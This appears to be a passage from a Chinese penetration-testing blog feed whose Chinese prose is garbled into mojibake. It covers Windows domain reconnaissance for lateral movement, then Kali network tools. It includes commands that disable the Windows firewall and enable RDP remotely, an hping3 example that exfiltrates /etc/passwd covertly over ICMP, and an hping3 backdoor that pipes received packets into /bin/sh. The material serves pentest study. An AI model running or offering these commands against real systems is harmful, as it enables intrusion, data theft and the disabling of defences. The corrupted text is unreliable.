src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210132346666.png"></p><p>ç”¨æ¥åˆ†æç½‘ç»œæ‹“æ‰‘ï¼Œå¦‚æœæœºå™¨åœ¨å†…ç½‘ä¸­æˆ‘ä»¬å°±å¯ä»¥æ‰©å¤§èŒƒå›´è¿›è¡Œå†…ç½‘çš„æ¨ªå‘æ¸—é€ï¼Œæ‹¿ä¸‹æ›´å¤šèµ„äº§</p></li><li><p><strong>æŸ¥è¯¢æ“ä½œç³»ç»Ÿå’Œç‰ˆæœ¬ä¿¡æ¯</strong>ï¼š<code>systeminfo | findstr /B /C:&quot;OS&quot;</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210132345103.png"></p><p>å¯ä»¥äº†è§£åˆ°æœ¬æœºçš„ç³»ç»Ÿç‰ˆæœ¬ï¼Œåœ¨æˆ‘ä»¬æƒ³è¦è¿›è¡Œææƒçš„æ—¶å€™æˆ‘ä»¬å¯ä»¥é’ˆå¯¹æ€§çš„å¯»æ‰¾å¯¹åº”çš„exp</p></li><li><p><strong>æŸ¥çœ‹æœ¬æœºå·²å®‰è£…çš„è½¯ä»¶åŠç‰ˆæœ¬ï¼Œè·¯å¾„</strong>ï¼š<code>wmic product get name,version</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210140055450.png"></p><p>é€šè¿‡æœé›†å·²å®‰è£…çš„è½¯ä»¶ä¿¡æ¯ï¼Œå¯ä»¥é’ˆå¯¹æŸæ¬¾è½¯ä»¶çš„æ¼æ´æ¥è¿›è¡Œä¸€äº›ææƒç­‰æ“ä½œ</p></li><li><p><strong>æŸ¥çœ‹æœ¬æœºè¿›ç¨‹ä¿¡æ¯</strong>ï¼š<code>tasklist /v</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210140100985.png"></p><p>é€šè¿‡è¯¥å‘½ä»¤æŸ¥è¯¢çš„ç³»ç»Ÿè¿›ç¨‹ä¿¡æ¯å¯æ˜¾ç¤ºå‡ºè¿›ç¨‹çš„è¿è¡Œç”¨æˆ·ï¼ˆSYSTEMç”¨æˆ·æƒé™ä»¥ä¸‹ï¼‰åŠç›®å½•ï¼Œåœ¨åæœŸæˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¤ç‰Œçªƒå–æ¥è¿›è¡Œæå–</p></li><li><p><strong>æ€æ¯’è½¯ä»¶è¿›ç¨‹æŸ¥çœ‹</strong>ï¼š<code>tasklist /SVC</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141410006.png"></p><p>å°†è¯¥å‘½ä»¤çš„è¿”å›å€¼æäº¤å¯¹åº”çš„<a href="https://www.adminxe.com/CompareAV/index.php">æŸ¥è¯¢ç½‘ç«™</a>å³å¯æŸ¥çœ‹æ˜¯å¦æœ‰æ€æ¯’è½¯ä»¶ï¼Œæ–¹ä¾¿æˆ‘ä»¬ä¸æ€è½¯å¯¹æŠ—</p></li><li><p><strong>å¯åŠ¨ç¨‹åºä¿¡æ¯</strong>ï¼š<code>wmic startup get command,caption</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141421601.png"></p><p>å¯ä»¥çœ‹åˆ°è¯¦ç»†çš„å¯åŠ¨é¡¹å‘½ä»¤åŠæè¿°</p></li><li><p><strong>æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡</strong>ï¼š<code>schtasks /query /fo LIST /v</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141535865.png"></p><p>é€šè¿‡æŸ¥çœ‹æœ¬æœºè®¡åˆ’ä»»åŠ¡å¯ä»¥åˆ©ç”¨å®šæ—¶ä»»åŠ¡æ¥åšå®šæ—¶ä»»åŠ¡åŠ«æŒ</p></li><li><p><strong>æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´</strong>ï¼š<code>net statistics workstation</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141538799.png"></p><p>å¯ä»¥é€šè¿‡æŸ¥çœ‹å¼€æœºæ—¶é—´æ¥åˆ¤æ–­æ˜¯å¦ç»å¸¸æœ‰äººç®¡ç†ä½¿ç”¨è¿™å°æœºå™¨</p></li><li><p><strong>æŸ¥çœ‹ç”¨æˆ·</strong>ï¼š<code>net user</code> <code>net user æ‰§è¡Œç”¨æˆ·</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141602726.png"></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141604248.png"></p><p>æ²¡å•¥å¥½è¯´çš„ï¼Œå°±æ˜¯æŸ¥çœ‹ç”¨æˆ·ï¼Œè¿˜å¯ä»¥æŸ¥çœ‹æŒ‡å®šç”¨æˆ·å±äºçš„ç»„</p></li><li><p><strong>æŸ¥çœ‹å½“å‰åœ¨çº¿ç”¨æˆ·</strong>ï¼š<code>query user || qwinsta</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141610279.png"></p><p>é€šè¿‡æŸ¥çœ‹å½“å‰åœ¨çº¿ç”¨æˆ·å¯ä»¥çŸ¥é“ç®¡ç†å‘˜æ˜¯å¦åœ¨ç™»å½•ï¼Œå¦‚æœæˆ‘ä»¬RDPç™»å½•åˆ°è¿œç¨‹æ¡Œé¢ç„¶åæ’ä¸Šç®¡ç†å‘˜å°±ä¸å¥½äº†</p></li><li><p><strong>æŸ¥çœ‹æœ¬æœºç«¯å£å¼€æ”¾æƒ…å†µ</strong>ï¼š<code>netstat -ano</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141614976.png"></p><p>å¯ä»¥æŸ¥çœ‹æœ¬æœºæ˜¯å¦ä¸å…¶ä»–æœºå™¨äº§ç”Ÿè¿æ¥ï¼Œåˆ†ææœ¬æœºå¼€å¯çš„ä¸šåŠ¡</p></li><li><p><strong>æŸ¥è¯¢è¡¥ä¸ä¿¡æ¯</strong>ï¼š<code>systeminfo</code> <code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141616251.png"><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141618610.png"></p><p>çœ‹çœ‹æ¼æ´æ˜¯å¦è¢«ä¿®å¤ï¼Œé’ˆå¯¹æ€§å¯»æ‰¾exp</p></li><li><p><strong>æŸ¥è¯¢è·¯ç”±è¡¨</strong>ï¼š<code>route print</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141622076.png"></p><p><strong>æ‰€æœ‰å¯ç”¨æ¥å£çš„ARPç¼“å†²è¡¨</strong>ï¼š<code>arp -a</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141633543.png"></p><p>é€šè¿‡åˆ†æè·¯ç”±å¯ä»¥çŸ¥é“æœºå™¨å¯ä»¥è®¿é—®å“ªäº›ç½‘æ®µçš„èµ„æº</p></li><li><p><strong>æŸ¥çœ‹é˜²ç«å¢™è®¾ç½®</strong>ï¼š<code>netsh firewall show config</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141635082.png"></p><p>æŸ¥çœ‹é˜²ç«å¢™çš„å¼€å…³æƒ…å†µï¼Œä»¥åŠç›¸å…³çš„é…ç½®ä¿¡æ¯</p><p>å¦‚æœæˆ‘ä»¬ç›¸å¯¹é˜²ç«å¢™ç›¸å…³å†…å®¹è¿›è¡Œä¸€äº›æ›´æ”¹å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">åœ¨Windows 2003åŠä¹‹å‰ç‰ˆæœ¬ï¼Œä½¿æŒ‡å®šç¨‹åºå…¨éƒ¨è¿æ¥ï¼šnetsh firewall add allowedprogram ç¨‹åºè·¯å¾„ <span class="token string">"è§„åˆ™å"</span> enableåœ¨Windows 2003ä¹‹åçš„ç‰ˆæœ¬ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼šnetsh advfirewall firewall add rule name=<span class="token string">"è§„åˆ™å"</span> <span class="token function">dir</span>=in action=allow program=<span class="token string">"ç¨‹åºè·¯å¾„"</span>å…è®¸æŒ‡å®šç¨‹åºè¿å‡ºï¼šnetsh advfirewall firewall add rule name=<span class="token string">"è§„åˆ™å"</span> <span class="token function">dir</span>=out action=allow program=<span class="token string">"ç¨‹åºè·¯å¾„"</span>å…è®¸æŒ‡å®šç«¯å£æ”¾è¡Œï¼šnetsh advfirewall firewall add rule name=<span class="token string">"è§„åˆ™å"</span> protocol=TCP <span class="token function">dir</span>=in localport=ç«¯å£ action=allow program=<span class="token string">"ç¨‹åºè·¯å¾„"</span>è‡ªå®šä¹‰é˜²ç«å¢™æ—¥å¿—å­˜å‚¨ä½ç½®ï¼šnetsh advfirewall <span class="token function">set</span> currentprofile logging filename <span class="token string">"å­˜å‚¨æ–‡ä»¶è·¯å¾„"</span>Windows 2003åŠä¹‹å‰ç‰ˆæœ¬å…³é—­é˜²ç«å¢™ï¼šnetsh firewall <span class="token function">set</span> opmode disableWindows 2003ä»¥åç‰ˆæœ¬å…³é—­é˜²ç«å¢™ï¼šnetsh advfirewall <span class="token function">set</span> allprofiles state off<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>æŸ¥è¯¢å¹¶å¼€å¯è¿œç¨‹æ¡Œé¢æœåŠ¡</strong>ï¼š<code>REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141652896.png"></p><p>å¼€å¯è¿œç¨‹æ¡Œé¢çš„å‘½ä»¤</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">Windows Server 2003å¼€3389ç«¯å£wmic path win32_terminalservicesetting where <span class="token punctuation">(</span>_CLASS <span class="token operator">!</span>=<span class="token string">""</span><span class="token punctuation">)</span> call setallowtsconnections 1Windows Server 2008 å’Œ Windows Server 2012å¼€3389ç«¯å£wmic <span class="token operator">/</span>namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where <span class="token punctuation">(</span>_CLASS <span class="token operator">!</span>=<span class="token string">""</span><span class="token punctuation">)</span> call setallowtsconnections 1æˆ–wmic <span class="token operator">/</span>namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where <span class="token punctuation">(</span>TerminalName=<span class="token string">'RDP-Tcp'</span><span class="token punctuation">)</span> call setuserauthenticationrequired 1Windows 7å¼€3389ç«¯å£reg add <span class="token string">"HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER"</span> <span class="token operator">/</span>v fSingleSessionPerUser <span class="token operator">/</span>t REG DWORD <span class="token operator">/</span>d 0 <span class="token operator">/</span>f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="åŸŸå†…ä¿¡æ¯æœé›†"><a href="#åŸŸå†…ä¿¡æ¯æœé›†" class="headerlink" title="åŸŸå†…ä¿¡æ¯æœé›†"></a>åŸŸå†…ä¿¡æ¯æœé›†</h3><ul><li><p><strong>è·å–åŸŸSID</strong>ï¼š<code>whoami /all</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210151703166.png"></p><p>æœé›†SIDå¯ä»¥ç”¨äºç¥¨æ®ä¼ é€’æ”»å‡»ï¼Œè¿˜æœ‰éƒ¨åˆ†ææƒæ–¹å¼éœ€è¦æ‰‹æœºç‰¹æƒä¿¡æ¯æ¥è¿›è¡Œ</p></li><li><p><strong>æŸ¥è¯¢åŸŸå†…å®¹æˆ·</strong>ï¼š<code>net user /domain</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210151706114.png"></p></li><li><p><strong>æŸ¥çœ‹åŸŸå†…ç”¨æˆ·è¯¦ç»†ä¿¡æ¯</strong>ï¼š<code>net user ç”¨æˆ·å /domain</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210151707950.png"></p><p>å¯ä»¥çœ‹åˆ°ç»„æˆå‘˜å†…å®¹æ¥åˆ¤æ–­ç”¨æˆ·ç»„åŠæƒé™</p></li><li><p><strong>æŸ¥çœ‹æœ¬æœºæ‰€åœ¨çš„æ‰€æœ‰åŸŸ</strong>ï¼š<code>net view /domain</code></p><p>åœ¨å­˜åœ¨å¤šä¸ªåŸŸçš„æ—¶å€™å¯ä»¥ä½¿ç”¨è¿™ä¸ªå‘½ä»¤æ¥çœ‹æ‰€å­˜åœ¨çš„æ‰€æœ‰åŸŸ</p></li><li><p><strong>æŸ¥è¯¢åŸŸç®¡ç†å‘˜åˆ—è¡¨</strong>ï¼š<code>net group &quot;domain admins&quot; /domain</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210161722867.png"></p><p>å¯ä»¥çœ‹åˆ°åªæœ‰ä¸€ä¸ªåŸŸç®¡ç†å‘˜</p></li><li><p><strong>æŸ¥çœ‹åŸŸå†…æ—¶é—´ï¼ˆæ—¶é—´æœåŠ¡å™¨ï¼‰</strong>ï¼š<code>net time /domain</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210161724650.png"></p><p>é€šè¿‡æŸ¥çœ‹åŸŸå†…æ—¶é—´ä»¥åŠæ—¶é—´æœåŠ¡å™¨ï¼Œå°±å¯ä»¥ä½¿ç”¨å®šæ—¶ä»»åŠ¡+IPCæ¥è¿è¡Œä¸€äº›batæ–‡ä»¶ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡pingåŸŸå†…æ—¶é—´æœåŠ¡å™¨æ¥å¾—åˆ°å…¶IP</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210161728786.png"></p></li><li><p><strong>æŸ¥çœ‹ç™»å½•æœ¬æœºçš„åŸŸç®¡ç†å‘˜</strong>ï¼š<code>net localgroup administrators /domain</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210161730087.png"></p></li><li><p><strong>æŸ¥çœ‹åŸŸä¸­æ‰€æœ‰ç”¨æˆ·ç»„</strong>ï¼š<code>net groups /domain</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210161731765.png"></p></li><li><p><strong>æŸ¥çœ‹ä¸»åŸŸæ§åˆ¶å™¨</strong>ï¼š<code>netdom query pdc</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210161732635.png"></p><p>ç›´æ¥pingå°±èƒ½æ‹¿åˆ°IP</p></li><li><p><strong>æŸ¥çœ‹æ‰€æœ‰åŸŸæ§åˆ¶å™¨</strong>ï¼š<code>net group &quot;Domain Controllers&quot; /domain</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210161734364.png"></p><p>è¿™é‡Œåº”è¯¥è¿˜æœ‰ä¸ªè¾…åŸŸçš„ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºå•¥æ¶ˆå¤±äº†ï¼Œåé¢å†å›æ¥çœ‹çœ‹</p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åŸŸæ§åˆ¶å™¨çš„æœºå™¨åç§°æ¥æŸ¥çœ‹åŸŸæ§ä¸»æœºï¼ŒçŸ¥é“å…¶IPåæˆ‘ä»¬å¯ä»¥å¯¹å…¶è¿›è¡Œé’ˆå¯¹æ€§çš„æ¸—é€ï¼Œåªéœ€æ¸—é€æ ¸å¿ƒæœºå™¨ï¼Œæ•´ä¸ªåŸŸçš„æ§åˆ¶æƒä¹Ÿå°±åˆ°æ‰‹äº†</p></li><li><p><strong>æŸ¥è¯¢åŸŸä¿¡ä»»ä¿¡æ¯</strong>ï¼š<code>nltest /domain_trusts</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210170338052.png"></p><p>å¯ä»¥çœ‹åˆ°ä¸»åŸŸåæ˜¯bxsteam.comï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ªsaulå­åŸŸï¼ŒäºŒè€…åŒå‘è®¤è¯ï¼Œå½¼æ­¤çš„ç”¨æˆ·å¯ä»¥äº’ç›¸ç™»å½•</p></li><li><p><strong>æŸ¥è¯¢åŸŸå¯†ç ä¿¡æ¯</strong>ï¼š<code>net accounts /domain</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210170340232.png"></p><p>å¯ä»¥çœ‹åˆ°åŸŸä¸­å¯†ç ä½¿ç”¨ç­–ç•¥ï¼Œåœ¨çˆ†ç ´æ—¶é˜²æ­¢æˆ‘ä»¬ç”Ÿæˆæ— æ•ˆçš„å¯†ç å­—å…¸</p></li></ul><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kaliä»0åˆ°1</title>
      <link href="/posts/8b8ae737.html"/>
      <url>/posts/8b8ae737.html</url>
      
        <content type="html"><![CDATA[<h1 id="å·¥å…·å¤§å…¨"><a href="#å·¥å…·å¤§å…¨" class="headerlink" title="å·¥å…·å¤§å…¨"></a>å·¥å…·å¤§å…¨</h1><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><h3 id="å­˜æ´»ä¸»æœºè¯†åˆ«"><a href="#å­˜æ´»ä¸»æœºè¯†åˆ«" class="headerlink" title="å­˜æ´»ä¸»æœºè¯†åˆ«"></a>å­˜æ´»ä¸»æœºè¯†åˆ«</h3><ul><li><p><strong>arping</strong>ï¼š</p><ul><li>ç±»ä¼¼äºpingï¼Œä¹Ÿæ˜¯ç”¨æ¥æ¢æµ‹å­˜æ´»çš„ï¼Œä¸è¿‡ä½¿ç”¨çš„arpåè®®ä¸æ˜¯ICMPåè®®ï¼Œæ‰€ä»¥åªèƒ½æ¢æµ‹å†…ç½‘ä¸èƒ½ç¢°å…¬ç½‘</li><li>-tå‚æ•°å¯ä»¥æ·»åŠ macåœ°å€ï¼Œæ¥ä¿è¯IPåœ°å€ç»‘å®šåˆ°äº†æŒ‡å®šçš„MACåœ°å€ä¸Š</li><li>è¿˜è¡Œå§ï¼Œå¯èƒ½pingä¸ç®¡ç”¨çš„æ—¶å€™å¯ä»¥ç”¨ï¼Œå“¦è¿˜å¯ä»¥ç”¨æ¥æmacåœ°å€</li></ul></li><li><p><strong>fping</strong>ï¼š</p><ul><li><p>pingçš„åŠ å¼ºç‰ˆï¼Œfpingå¯ä»¥åœ¨å‘½ä»¤è¡Œä¸­æŒ‡å®šè¦pingçš„ä¸»æœºèŒƒå›´</p></li><li><p>ä¸pingè¦ç­‰å¾…æŸä¸€ä¸»æœºè¿æ¥è¶…æ—¶æˆ–å‘å›åé¦ˆä¿¡æ¯ä¸åŒï¼Œfpingç»™ä¸€ä¸ªä¸»æœºå‘é€å®Œæ•°æ®åŒ…åï¼Œé©¬ä¸Šç»™ä¸‹ä¸€ä¸ªä¸»æœºå‘é€æ•°æ®åŒ…ï¼Œå®ç°å¤šä¸»æœºåŒæ—¶pingã€‚å¦‚æœæŸä¸€ä¸»æœºpingé€šï¼Œåˆ™æ­¤ä¸»æœºå°†è¢«æ‰“ä¸Šæ ‡è®°ï¼Œå¹¶ä»ç­‰å¾…åˆ—è¡¨ä¸­ç§»é™¤ï¼Œå¦‚æœæ²¡pingé€šï¼Œè¯´æ˜ä¸»æœºæ— æ³•åˆ°è¾¾ï¼Œä¸»æœºä»ç„¶ç•™åœ¨ç­‰å¾…åˆ—è¡¨ä¸­ï¼Œç­‰å¾…åç»­æ“ä½œã€‚</p></li><li><p>```shell<br>fping IP1 IP2 IP3 â€¦<br>fping -f filename<br>fping -g IP1 IP2<br>å¯ä»¥æ·»åŠ -aå‚æ•°æ¥åªæ˜¾ç¤ºå­˜æ´»ä¸»æœº</p><pre class="line-numbers language-none"><code class="language-none">  - pingçš„å‡çº§ç‰ˆï¼ˆè‡ªå·±å†™æ­Œè„šæœ¬è²Œä¼¼ä¹Ÿå·®ä¸å¤šï¼‰- **hping3**ï¼š  - hpingæ˜¯å®‰å…¨å®¡è®¡ã€é˜²ç«å¢™æµ‹è¯•ç­‰å·¥ä½œçš„æ ‡é…å·¥å…·ã€‚hpingä¼˜åŠ¿åœ¨äºèƒ½å¤Ÿå®šåˆ¶æ•°æ®åŒ…çš„å„ä¸ªéƒ¨åˆ†ï¼Œå› æ­¤ç”¨æˆ·å¯ä»¥çµæ´»å¯¹ç›®æ ‡æœºè¿›è¡Œç»†è‡´åœ°æ¢æµ‹ã€‚  - å¯ä»¥è‡ªå·±å®šåˆ¶æ•°æ®åŒ…æ¥æ¢æµ‹é˜²ç«å¢™ï¼Œä¹Ÿå¯ä»¥è¯¦ç»†æŸ¥çœ‹å“åº”æ¥åˆ¤æ–­æ‹¦æˆªç­‰å†…å®¹ï¼Œç”šè‡³å¯ä»¥ç”¨æ¥ä¼ªé€ ICMPåŒ…æ¥æ‰“DDOS  - &#96;&#96;&#96;    -a æŒ‡å®šåŒ…çš„è¯·æ±‚IPï¼Œå¯ä»¥æŒ‡å®šä¸ºç›®æ ‡æ¥è®©è‡ªå·±åå¤pingè‡ªå·±ï¼Œä¸è¿‡è¿™æ ·çš„è¯è‡ªå·±ä¹Ÿå°±æ”¶ä¸åˆ°å“åº”æ•°æ®äº†    -p æŒ‡å®šç«¯å£    -I æŒ‡å®šç½‘å¡    -c æŒ‡å®šå‘åŒ…æ¬¡æ•°<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>æ–‡ä»¶ä¼ è¾“</strong></p><ul><li><p>Hping3æ”¯æŒé€šè¿‡TCP/UDP/ICMPç­‰åŒ…æ¥è¿›è¡Œæ–‡ä»¶ä¼ è¾“ã€‚ç›¸å½“äºå€ŸåŠ©TCP/UDP/ICMPåŒ…å»ºç«‹éšç§˜éš§é“é€šè®¯ã€‚å®ç°æ–¹å¼æ˜¯å¼€å¯ç›‘å¬ç«¯å£ï¼Œå¯¹æ£€æµ‹åˆ°çš„ç­¾åï¼ˆç­¾åä¸ºç”¨æˆ·æŒ‡å®šçš„å­—ç¬¦ä¸²ï¼‰çš„å†…å®¹è¿›è¡Œç›¸åº”çš„è§£æã€‚åœ¨æ¥æ”¶ç«¯å¼€å¯æœåŠ¡ï¼š</p></li><li><p>```shell<br>hping3 æºIP â€“listen signature â€“safe  â€“icmp</p><pre class="line-numbers language-none"><code class="language-none">- ç›‘å¬ICMPåŒ…ä¸­çš„ç­¾åï¼Œæ ¹æ®ç­¾åè§£æå‡ºæ–‡ä»¶å†…å®¹ã€‚- åœ¨å‘é€ç«¯ä½¿ç”¨ç­¾åæ‰“åŒ…çš„ICMPåŒ…å‘é€æ–‡ä»¶ï¼š- &#96;&#96;&#96;shell  hping3 ç›®æ ‡IP --icmp -d 100 --sign signature --file &#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>å°†<code>/etc/passwd</code>å¯†ç æ–‡ä»¶é€šè¿‡ICMPåŒ…ä¼ ç»™ç›®æ ‡ä¸»æœºã€‚å‘é€åŒ…å¤§å°ä¸º100å­—èŠ‚ï¼ˆ-d 100ï¼‰ï¼Œå‘é€ç­¾åä¸ºsignature(-sign signature)ã€‚</p></li></ul></li><li><p><strong>åå¼¹shellåŠŸèƒ½</strong></p><ul><li><p>å¦‚æœHping3èƒ½å¤Ÿåœ¨è¿œç¨‹ä¸»æœºä¸Šå¯åŠ¨ï¼Œé‚£ä¹ˆå¯ä»¥ä½œä¸ºæœ¨é©¬ç¨‹åºå¯åŠ¨ç›‘å¬ç«¯å£ï¼Œå¹¶åœ¨å»ºç«‹è¿æ¥åæ‰“å¼€shellé€šä¿¡ã€‚ä¸netcatçš„åé—¨åŠŸèƒ½ç±»ä¼¼ã€‚</p></li><li><p>ç¤ºä¾‹ï¼šæœ¬åœ°æ‰“å¼€53å·UDPç«¯å£ï¼ˆDNSè§£ææœåŠ¡ï¼‰ç›‘å¬æ¥è‡ª192.168.10.66ä¸»æœºçš„åŒ…å«ç­¾åä¸ºsignatureçš„æ•°æ®åŒ…ï¼Œå¹¶å°†æ”¶åˆ°çš„æ•°æ®è°ƒç”¨/bin/shæ‰§è¡Œã€‚</p></li><li><p>åœ¨æœ¨é©¬å¯åŠ¨ç«¯ï¼š</p></li><li><p>```<br>hping3 192.168.10.66â€“listen signature â€“safe â€“udp -p 53 | /bin/sh</p><pre class="line-numbers language-none"><code class="language-none">- åœ¨è¿œç¨‹æ§åˆ¶ç«¯ï¼š- &#96;&#96;&#96;  echo ls &gt;test.cmd hping3 192.168.10.44 -p53 -d 100 --udp --sign siganature --file .&#x2F;test.cmd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>å°†åŒ…å«lså‘½ä»¤çš„æ–‡ä»¶åŠ ä¸Šç­¾åsignatureå‘é€åˆ°192.168.10.44ä¸»æœºçš„53å·UDPç«¯å£ï¼ŒåŒ…æ•°æ®é•¿åº¦ä¸º100å­—èŠ‚ã€‚</p></li><li><p>å½“ç„¶è¿™é‡Œåªæ˜¯ç®€å•çš„æ¼”ç¤ºç¨‹åºï¼ŒçœŸå®çš„åœºæ™¯ï¼Œæ§åˆ¶ç«¯å¯ä»¥åˆ©ç›Šshellæ‰§è¡Œå¾ˆå¤šçš„é«˜çº§å¤æ‚çš„æ“ä½œã€‚</p></li></ul></li><li><p>å¥½é«˜çº§çš„è¯´ï¼Œå¯ä»¥è‡ªå®šä¹‰çš„éƒ¨åˆ†ä¹Ÿå¾ˆå¤šï¼Œä¹Ÿæœ‰ä¸€äº›æœ‰è¶£çš„åº”ç”¨ï¼Œå¯å†²</p></li></ul></li><li><p><strong>masscan</strong>ï¼š</p><ul><li><p>åˆä¸€ä¸ªæ‰«æå·¥å…·ï¼Œç»™ä¸ªä¾‹å­å°±è¿‡ï¼Œå¥½å¿«å•Š</p></li><li><p>```<br>masscan -p80,8080-8100 10.0.0.0/8<br>ï¼ˆæ‰«æ10.x.x.xå­ç½‘ï¼Œæ‰«æç«¯å£80å’Œ8000-8100èŒƒå›´çš„ç«¯å£æ®µï¼‰<br>å¯ä½¿ç”¨â€“echoæŠŠå½“å‰é…ç½®è¾“å‡ºåˆ°æ–‡ä»¶ï¼Œ-cä½¿ç”¨æ–‡ä»¶<br>â€“source-ip æŒ‡å®šæºIP<br>â€“excludefile æ–‡ä»¶ æŒ‡å®šç½‘æ®µå¿½ç•¥<br>â€“max-rate 100000 æœ€é«˜å‘åŒ…é€Ÿç‡<br>â€“banners è·å–bannerä¿¡æ¯ï¼Œæ”¯æŒå°‘é‡çš„åè®®</p><pre class="line-numbers language-none"><code class="language-none">  - mdä½ å¿«æœ‰ä¸ªåµå­ç”¨ï¼Œæ‰«ä¸å‡ºæ¥ç«¯å£å­˜æ´»ä¿¡æ¯å•Š- **thcping6**ï¼š  - é’ˆå¯¹IPV6çš„å‘åŒ…å·¥å…·ï¼Œéš¶å±äºatk6è¿™ä¸ªè¿™ä¸ªå·¥å…·åŒ…ä¸‹ï¼Œå®˜æ–¹æè¿°æ˜¯sends a hand crafted ping6 packetï¼Œå°±æ˜¯æ‰‹åŠ¨æ„é€ ä¸€ä¸ªping6çš„æ•°æ®åŒ…  - å­¦äº†IPV6å†æ¥### è·¯ç”±åˆ†æ- **netdiscover**ï¼š    - äºŒå±‚å‘ç°å·¥å…·ï¼Œæ‹¥æœ‰ä¸»åŠ¨å’Œè¢«åŠ¨å‘ç°ä¸¤ç§æ–¹å¼ï¼Œé€šè¿‡ARPè·¯ç”±è¡¨æ¢æµ‹  - æœ€ç®€å•çš„å°±æ˜¯ç›´æ¥è¾“å…¥netdiscoverä¹‹åå°±æ˜¯è¿è¡Œå®ƒçš„é»˜è®¤é…ç½®ç„¶åæ‰«æå±€åŸŸç½‘ä¸­æ‰€æœ‰çš„æœºå™¨  - ä¹Ÿå¯ä»¥ç›´æ¥è¾“å…¥ç½‘å¡è®©ä»–è‡ªå·±è·‘ä¸¤å±‚  - æ¯å¤©ä¸€ä¸ªè¢«æ‰“ç”µè¯å°æŠ€å·§  - **netmask**ï¼š  - netmakså¯ä»¥åœ¨ IPèŒƒå›´ã€å­ç½‘æ©ç ã€cidrã€ciscoç­‰æ ¼å¼ä¸­äº’ç›¸è½¬æ¢ï¼Œå¹¶ä¸”æä¾›äº†IPåœ°å€çš„ç‚¹åˆ†åè¿›åˆ¶ã€16è¿›åˆ¶ã€8è¿›åˆ¶ã€2è¿›åˆ¶ä¹‹é—´çš„äº’ç›¸è½¬æ¢  - &#96;&#96;&#96;    Usage: netmask spec [spec ...]      -h, --help                    Print a 